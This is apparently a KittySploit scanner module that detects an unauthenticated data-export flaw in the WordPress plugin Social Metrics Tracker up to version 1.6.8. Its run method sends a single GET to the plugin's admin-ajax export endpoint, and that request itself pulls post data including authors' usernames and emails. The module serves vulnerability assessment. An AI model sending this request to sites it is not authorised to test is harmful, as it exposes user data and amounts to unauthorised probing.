#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The lack of proper authorisation when exporting data from the plugin could allow unauthenticated users to get ."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Social Metrics Tracker <= 1.6.8 - Unauthorised Data Export Detection',
        'description': "The lack of proper authorisation when exporting data from the plugin could allow unauthenticated users to get information about the posts and page of the blog, including their author's username and email.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'wordpress', 'wp-plugin', 'wp', 'unauth', 'wpscan', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://wpscan.com/vulnerability/f4eed3ba-2746-426f-b030-a8c432defeb2'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?page=social-metrics-tracker-export&smt_download_export_file=1', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Main URL to Post',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="Social Metrics Tracker <= 1.6.8 - Unauthorised Data Export detected",
                path='/wp-admin/admin-ajax.php?page=social-metrics-tracker-export&smt_download_export_file=1',
            )
            return True
        return False

